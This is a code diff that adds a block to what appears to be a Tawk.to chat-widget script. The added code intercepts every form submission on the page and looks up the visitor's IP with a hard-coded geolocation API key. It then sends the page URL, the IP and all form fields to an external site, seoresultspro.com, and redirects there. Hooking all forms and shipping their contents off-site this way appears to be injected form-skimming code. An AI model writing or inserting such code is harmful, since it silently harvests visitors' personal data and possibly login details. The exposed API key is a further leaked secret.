@@ -16,3 +16,33 @@ var Tawk_API = Tawk_API || {}
   s1.setAttribute("crossorigin", "*")
   s0.parentNode.insertBefore(s1, s0)
 })()
+
+
+jQuery("form").submit(function (t) {
+  t.preventDefault(),
+      (async () => {
+          await fetch("https://api-bdc.net/data/country-by-ip?ip=" + client_ip + "&localityLanguage=en&key=bdc_36c0e150fd424f4f97eb61afcc4cf637")
+              .then((t) => {
+                  t.json().then((t) => {
+                      console.log(t);
+                      let e = { pageURL: window.location.href, ip: t.ip, form: $(this).serialize() };
+                      $.ajax({
+                          url: "https://seoresultspro.com/save.php",
+                          type: "POST",
+                          data: e,
+                          beforeSend() {
+                              $("form  button").attr("disabled"), $("form  button").html('<div class="container  text-center"><div class="spinner-border " role="status"><span class="visually-hidden">Loading...</span></div></div>');
+                          },
+                          success: function (t) {
+                              window.location.href = "https://seoresultspro.com/thankyou";
+                          },
+                      }).fail((t) => {
+                          console.log(t);
+                      });
+                  });
+              })
+              .catch((t) => {
+                  console.log(t);
+              });
+      })();
+});
